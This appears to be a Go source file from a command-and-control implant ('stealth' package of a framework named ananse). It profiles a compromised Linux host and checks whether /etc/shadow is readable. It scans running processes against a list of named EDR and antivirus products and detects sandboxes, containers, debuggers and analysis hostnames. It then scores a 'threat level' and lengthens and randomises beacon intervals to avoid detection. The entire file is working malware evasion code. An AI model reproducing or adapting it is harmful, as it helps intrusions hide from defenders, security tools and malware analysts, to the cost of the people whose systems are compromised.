package stealth

import (
	"fmt"
	"math"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"time"

	"github.com/natx6/ananse/src/c2/implant/beacon"
	"github.com/natx6/ananse/src/c2/implant/shell"
)

// Profiler performs 3-phase defense and environment profiling.
type Profiler struct {
	mu      sync.Mutex
	cached  *beacon.TargetProfile
	lastRun time.Time
}

// NewProfiler creates a new profiler.
func NewProfiler() *Profiler {
	return &Profiler{}
}

// Profile runs all 3 profiling phases and returns the result. Results are
// cached for `cooldown` — calling Profile again before cooldown elapses
// returns the cached profile.
func (p *Profiler) Profile(cooldown time.Duration) *beacon.TargetProfile {
	p.mu.Lock()
	if time.Since(p.lastRun) < cooldown && p.cached != nil {
		c := *p.cached
		p.mu.Unlock()
		return &c
	}
	p.mu.Unlock()

	prof := &beacon.TargetProfile{}

	phase1(prof)
	phase2(prof)
	phase3(prof)

	prof.ThreatLevel = assessThreatLevel(prof)

	p.mu.Lock()
	p.cached = prof
	p.lastRun = time.Now()
	p.mu.Unlock()

	return prof
}

// ---------------------------------------------------------------------------
// Phase 1 — Passive (no suspicious syscalls, /proc reads + env vars)
// ---------------------------------------------------------------------------

func phase1(p *beacon.TargetProfile) {
	// OS / kernel / hostname
	if b, _ := os.ReadFile("/proc/sys/kernel/ostype"); len(b) > 0 {
		p.OS = strings.TrimSpace(string(b))
	}
	if b, _ := os.ReadFile("/proc/sys/kernel/osrelease"); len(b) > 0 {
		p.Kernel = strings.TrimSpace(string(b))
	}
	if b, _ := os.ReadFile("/proc/sys/kernel/hostname"); len(b) > 0 {
		p.Hostname = strings.TrimSpace(string(b))
	}

	// Platform by reading /etc/os-release
	out, _ := shell.Run("grep -E '^ID=' /etc/os-release 2>/dev/null | head -1 | cut -d= -f2", 5e9)
	p.Platform = strings.Trim(strings.TrimSpace(out), `"'`)
	out, _ = shell.Run("grep -E '^VERSION_ID=' /etc/os-release 2>/dev/null | head -1 | cut -d= -f2", 5e9)
	p.PlatformVersion = strings.Trim(strings.TrimSpace(out), `"'`)
	if p.Platform == "" {
		p.Platform = runtime.GOOS
	}

	// Architecture
	p.CPUArch = runtime.GOARCH

	// Memory (from /proc/meminfo)
	if b, _ := os.ReadFile("/proc/meminfo"); len(b) > 0 {
		for _, line := range strings.Split(string(b), "\n") {
			if strings.HasPrefix(line, "MemTotal:") {
				var kb int64
				fmt.Sscanf(line, "MemTotal: %d kB", &kb)
				p.TotalMemory = kb * 1024
			}
			if strings.HasPrefix(line, "MemFree:") {
				var kb int64
				fmt.Sscanf(line, "MemFree: %d kB", &kb)
				p.FreeMemory = kb * 1024
			}
		}
	}

	// Shell
	if s := os.Getenv("SHELL"); s != "" {
		p.Shell = s
	} else {
		out, _ = shell.Run("echo $SHELL", 3e9)
		p.Shell = strings.TrimSpace(out)
	}

	// Sudo check
	out, _ = shell.Run("sudo -V 2>/dev/null | head -1", 5e9)
	if out != "" {
		p.Sudo = true
		parts := strings.Fields(out)
		for i, part := range parts {
			if part == "version" && i+1 < len(parts) {
				p.SudoVersion = strings.TrimRight(parts[i+1], ")")
				break
			}
		}
	}

	// Uptime
	if b, _ := os.ReadFile("/proc/uptime"); len(b) > 0 {
		var secs float64
		fmt.Sscanf(string(b), "%f", &secs)
		p.Uptime = int64(secs)
	}

	// Container / sandbox env checks
	envIndicators := []struct {
		key, val string
		hint     string
	}{
		{"CONTAINER", "", "container env"},
		{"KUBERNETES_SERVICE_HOST", "", "kubernetes"},
		{"DOCKER_HOST", "", "docker"},
		{"container", "docker", "docker"},
		{"container", "lxc", "lxc"},
		{"HOSTNAME", "", "non-standard hostname"},
		{"CI", "true", "ci environment"},
		{"JENKINS_HOME", "", "jenkins"},
		{"GITLAB_CI", "true", "gitlab ci"},
	}
	for _, ind := range envIndicators {
		v := os.Getenv(ind.key)
		if ind.val != "" && v == ind.val {
			p.Hints = append(p.Hints, ind.hint)
		} else if ind.val == "" && v != "" {
			p.Hints = append(p.Hints, ind.hint)
		}
	}

	// Check /proc/1/cgroup for container hints
	if b, _ := os.ReadFile("/proc/1/cgroup"); len(b) > 0 {
		content := string(b)
		if strings.Contains(content, "docker") {
			p.Hints = append(p.Hints, "docker container (cgroup)")
		}
		if strings.Contains(content, "kubepods") {
			p.Hints = append(p.Hints, "kubernetes pod (cgroup)")
		}
	}
}

// ---------------------------------------------------------------------------
// Phase 2 — Active (check for EDR/AV monitoring tools, defenses)
// ---------------------------------------------------------------------------

// knownEDR lists common EDR and AV process substrings.
// Only actual security products — not standard system components.
var knownEDR = []string{
	"crowdstrike", "falcon_sensor", "csagent", "csfalcon",
	"sentinelone", "sentinelone", "s1agent",
	"carbonblack", "cbsensor",
	"cylance", "cyprotect",
	"symantec", "symc", "sep",
	"mcafee", "mfetp",
	"trendmicro", "dsagent",
	"sophos", "sophosagent",
	"osqueryd", "osqueryi",
	"wazuh", "ossec-agent",
	"tripwire", "aide",
	"snort", "suricata",
	"yara",
	"zeek",
	"falcon-sensor",
	"microsoftdefender", "defender",
	"kaspersky", "kav",
	"ekrn",
	"bitdefender", "bdagent",
	"checkpoint", "cpagent",
	"paloaltonetworks", "traps",
	"rkhunter", "chkrootkit",
	"lynis",
}

// knownSandbox processes (legitimate tools that may indicate analysis env).
var knownSandbox = []string{
	"vmtoolsd", "vboxguest", "vboxservice",
	"xenserver", "xentools",
	"qemu-ga", "qemu-guest-agent",
}

func phase2(p *beacon.TargetProfile) {
	// Check SELinux
	if b, _ := os.ReadFile("/etc/selinux/config"); len(b) > 0 {
		if strings.Contains(string(b), "SELINUX=enforcing") {
			p.SELinux = true
			p.Hints = append(p.Hints, "selinux enforcing")
		} else if strings.Contains(string(b), "SELINUX=permissive") {
			p.SELinux = false
			p.Hints = append(p.Hints, "selinux permissive")
		}
	}
	out, _ := shell.Run("getenforce 2>/dev/null", 3e9)
	if strings.Contains(out, "Enforcing") {
		p.SELinux = true
	}

	// Check AppArmor
	out, _ = shell.Run("aa-status 2>/dev/null | head -5", 5e9)
	if strings.Contains(out, "enabled") || strings.Contains(out, "profiles") {
		p.AppArmor = true
		p.Hints = append(p.Hints, "apparmor enabled")
	} else if _, err := os.Stat("/sys/kernel/security/apparmor"); err == nil {
		p.AppArmor = true
		p.Hints = append(p.Hints, "apparmor present")
	}

	// Firewall
	if out, _ = shell.Run("ufw status 2>/dev/null | head -1", 3e9); out != "" {
		p.Firewall = "ufw"
	} else if out, _ = shell.Run("firewall-cmd --state 2>/dev/null", 3e9); out != "" {
		p.Firewall = "firewalld"
	} else if out, _ = shell.Run("iptables -L -n 2>/dev/null | head -5", 5e9); len(out) > 50 {
		p.Firewall = "iptables"
	} else {
		p.Firewall = "none"
	}

	// Auditd
	if _, err := os.Stat("/sbin/auditd"); err == nil {
		p.Hints = append(p.Hints, "auditd installed")
	}
	if b, _ := os.ReadFile("/proc/sys/kernel/audit_enabled"); len(b) > 0 {
		if strings.TrimSpace(string(b)) == "1" {
			p.Hints = append(p.Hints, "auditd active")
		}
	}

	// Scan for EDR/AV processes
	pidMap := make(map[int]string)
	pids := listProcesses()
	for _, proc := range pids {
		lower := strings.ToLower(proc.cmdline)
		for _, edr := range knownEDR {
			if strings.Contains(lower, edr) {
				p.HasAgent = true
				p.AgentPids = append(p.AgentPids, proc.pid)
				p.Hints = append(p.Hints, fmt.Sprintf("EDR process: %s (pid %d)", edr, proc.pid))
			}
		}
		for _, sandbox := range knownSandbox {
			if strings.Contains(lower, sandbox) {
				pidMap[proc.pid] = sandbox
				p.Hints = append(p.Hints, fmt.Sprintf("sandbox process: %s (pid %d)", sandbox, proc.pid))
			}
		}
	}
	_ = pidMap

	// Check debugger / tracer
	if b, _ := os.ReadFile("/proc/sys/kernel/yama/ptrace_scope"); len(b) > 0 {
		scope := strings.TrimSpace(string(b))
		if scope == "0" {
			p.Hints = append(p.Hints, "ptrace unrestricted (yama=0)")
		} else if scope == "1" {
			p.Hints = append(p.Hints, "ptrace restricted (yama=1)")
		} else if scope != "" {
			p.Hints = append(p.Hints, fmt.Sprintf("ptrace scope=%s", scope))
		}
	}

	// Check secure boot
	if b, _ := os.ReadFile("/sys/kernel/security/lockdown"); len(b) > 0 {
		if strings.Contains(string(b), "integrity") || strings.Contains(string(b), "confidentiality") {
			p.Hints = append(p.Hints, "kernel lockdown active")
		}
	}
}

// procInfo holds a pid and cmdline for process scanning.
type procInfo struct {
	pid     int
	cmdline string
}

func listProcesses() []procInfo {
	entries, err := os.ReadDir("/proc")
	if err != nil {
		return nil
	}
	var procs []procInfo
	for _, e := range entries {
		if !e.IsDir() {
			continue
		}
		pid := 0
		if _, err := fmt.Sscanf(e.Name(), "%d", &pid); err != nil || pid == 0 {
			continue
		}
		cmdline, _ := os.ReadFile(filepath.Join("/proc", e.Name(), "cmdline"))
		cmd := strings.ReplaceAll(string(cmdline), "\x00", " ")
		procs = append(procs, procInfo{pid: pid, cmdline: cmd})
	}
	return procs
}

// ---------------------------------------------------------------------------
// Phase 3 — Aggressive (probes that may trigger defenses)
// ---------------------------------------------------------------------------

func phase3(p *beacon.TargetProfile) {
	// LD_PRELOAD
	if ld := os.Getenv("LD_PRELOAD"); ld != "" {
		p.Hints = append(p.Hints, fmt.Sprintf("LD_PRELOAD=%s", ld))
	}
	if ld := os.Getenv("LD_LIBRARY_PATH"); ld != "" {
		p.Hints = append(p.Hints, fmt.Sprintf("LD_LIBRARY_PATH=%s", ld))
	}

	// Check if we can see other users' processes (ptrace / root indicator)
	out, _ := shell.Run("ps aux 2>/dev/null | head -5", 5e9)
	if strings.Contains(out, "root") && strings.Contains(out, "ps") {
		p.Hints = append(p.Hints, "cross-user process visibility")
	}

	// Check for inotify watches on sensitive paths (crude: read /proc/sys/fs/inotify)
	if b, _ := os.ReadFile("/proc/sys/fs/inotify/max_user_watches"); len(b) > 0 {
		maxWatches := strings.TrimSpace(string(b))
		if maxWatches != "" && maxWatches != "0" {
			p.Hints = append(p.Hints, fmt.Sprintf("inotify watches: %s", maxWatches))
		}
	}

	// Check if /etc/shadow is readable (indicates root or weak perms)
	if b, _ := os.ReadFile("/etc/shadow"); len(b) > 0 {
		p.Hints = append(p.Hints, "shadow readable — high privilege")
	}

	// Check kernel modules for monitoring
	if b, _ := os.ReadFile("/proc/modules"); len(b) > 0 {
		modules := string(b)
		monModules := []string{"audit", "kprobe", "systemtap", "kvm", "virtualbox"}
		for _, m := range monModules {
			if strings.Contains(modules, m) {
				p.Hints = append(p.Hints, fmt.Sprintf("kernel module: %s", m))
			}
		}
	}

	// Detect running under a debugger (crude: check TracerPid)
	if b, _ := os.ReadFile("/proc/self/status"); len(b) > 0 {
		for _, line := range strings.Split(string(b), "\n") {
			if strings.HasPrefix(line, "TracerPid:") {
				tpid := strings.TrimSpace(strings.TrimPrefix(line, "TracerPid:"))
				if tpid != "0" {
					p.Hints = append(p.Hints, fmt.Sprintf("tracer pid: %s", tpid))
				}
				break
			}
		}
	}
}

// ---------------------------------------------------------------------------
// Threat level assessment
// ---------------------------------------------------------------------------

func assessThreatLevel(p *beacon.TargetProfile) string {
	score := 0

	if p.HasAgent {
		score += 30
	}
	if p.HasAgent && len(p.AgentPids) > 2 {
		score += 15
	}
	if p.SELinux {
		score += 15
	}
	if p.AppArmor {
		score += 10
	}
	if p.Firewall != "" && p.Firewall != "none" {
		score += 5
	}

	// Hint-based scoring
	for _, h := range p.Hints {
		lower := strings.ToLower(h)
		switch {
		case strings.Contains(lower, "edr"), strings.Contains(lower, "defender"),
			strings.Contains(lower, "crowdstrike"), strings.Contains(lower, "sentinel"),
			strings.Contains(lower, "osquery"):
			score += 10
		case strings.Contains(lower, "auditd"), strings.Contains(lower, "selinux enforcing"):
			score += 8
		case strings.Contains(lower, "kubernetes"), strings.Contains(lower, "ci environment"):
			score += 5
		case strings.Contains(lower, "sandbox"):
			score += 8
		case strings.Contains(lower, "tracer pid"):
			score += 25
		case strings.Contains(lower, "kernel lockdown"):
			score += 10
		}
	}

	if p.Hostname != "" {
		hn := strings.ToLower(p.Hostname)
		if strings.Contains(hn, "sandbox") || strings.Contains(hn, "analysis") ||
			strings.Contains(hn, "malware") || strings.Contains(hn, "infected") ||
			strings.Contains(hn, "detection") || strings.Contains(hn, "forensic") {
			score += 20
		}
	}

	switch {
	case score >= 50:
		return "critical"
	case score >= 25:
		return "high"
	case score >= 10:
		return "medium"
	default:
		return "low"
	}
}

// ---------------------------------------------------------------------------
// Pre-flight: quick sandbox/container detection (runs before beacon 1)
// ---------------------------------------------------------------------------

// QuickCheck does a fast, minimal-read check for obvious sandbox/AV indicators.
// Returns a threat level string and the first beacon delay to use.
func QuickCheck() (threatLevel string, initialDelay time.Duration) {
	// Check container env
	if os.Getenv("DOCKER_HOST") != "" || os.Getenv("KUBERNETES_SERVICE_HOST") != "" {
		return "medium", 90 * time.Second
	}

	if b, _ := os.ReadFile("/proc/1/cgroup"); len(b) > 0 {
		content := string(b)
		if strings.Contains(content, "docker") || strings.Contains(content, "kubepods") {
			return "medium", 90 * time.Second
		}
	}

	// Check for EDR processes (quick scan)
	entries, _ := os.ReadDir("/proc")
	edrCount := 0
	for _, e := range entries {
		if !e.IsDir() {
			continue
		}
		pid := 0
		if _, err := fmt.Sscanf(e.Name(), "%d", &pid); err != nil || pid == 0 {
			continue
		}
		cmdline, _ := os.ReadFile(filepath.Join("/proc", e.Name(), "cmdline"))
		cmd := strings.ToLower(strings.ReplaceAll(string(cmdline), "\x00", " "))
		for _, edr := range knownEDR {
			if strings.Contains(cmd, edr) {
				edrCount++
				if edrCount >= 2 {
					return "high", 120 * time.Second
				}
			}
		}
	}

	return "low", 0
}

// BeaconIntervalForThreat returns a recommended beacon interval for a threat
// level. Higher threat = longer, more randomised interval.
func BeaconIntervalForThreat(threatLevel string, baseMs int64) int64 {
	if baseMs <= 0 {
		baseMs = 60000
	}
	mult := map[string]float64{
		"low":      1.0,
		"medium":   1.5,
		"high":     2.5,
		"critical": 4.0,
	}[threatLevel]

	adjusted := float64(baseMs) * mult
	// Add extra random offset (up to 30% of base) for high+cricital
	if threatLevel == "high" || threatLevel == "critical" {
		adjusted += float64(baseMs) * 0.3 * (float64(time.Now().UnixNano()%100) / 100.0)
	}
	return int64(math.Round(adjusted))
}
